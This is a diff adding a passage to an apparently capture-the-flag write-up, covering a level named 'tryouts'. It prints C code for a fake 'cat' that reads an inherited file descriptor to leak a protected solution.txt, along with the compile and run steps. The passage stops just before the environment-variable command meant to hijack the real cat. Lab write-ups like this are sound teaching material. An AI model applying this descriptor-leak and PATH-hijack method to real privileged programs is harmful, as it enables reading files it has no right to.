@@ -142,3 +142,38 @@ touch new
 ```
 ./pytong /home/user/username/new
 ```
+# 5. Tryouts
+> Find in /home/level/matrixman/13_tryouts
+* In /home/level/matrixman/13_tryouts, there's a C language code called tryouts.c and its compiled version tryouts. There's also a solution.txt file that we don't have access to.
+* The **tryouts.c** file asks us to guess a random number generated using /dev/urandom
+### For this Level to get the flag, I used the following strategy: 
+* First, I create a file called cat.c
+```
+nano cat.c
+```
+* Then I write a script in this file.
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+FILE *fp = fopen(argv[1], "w");
+char buf[16];
+memset(buf, 0, sizeof buf);
+lseek(3, 0, SEEK_SET);
+read(3, buf, sizeof buf);
+fprintf(fp, "%s", buf);
+return 0;
+}
+```
+> This code will read characters from file descriptor 3 *(since in our case descriptors 0 to 2 are probably already used by tryouts.c)* and write them to a file specified as a parameter. We'll use this code to write the contents of ***solution.txt*** to another file.
+* Now we'll compile the previous code to create an executable called cat :
+```
+gcc -m32 cat.c -o cat
+```
+* Then let's run this program, specifying the output file in which to write the contents of solution.txt
+> The output file was created in advance with ` touch seed `
+```
+./cat seed
+```
+* We've called this program **cat** because we want the system to use it instead of the **_default cat command_**, which displays the contents of a file. To do this, we'll use the following command, which will modify the environment variables:
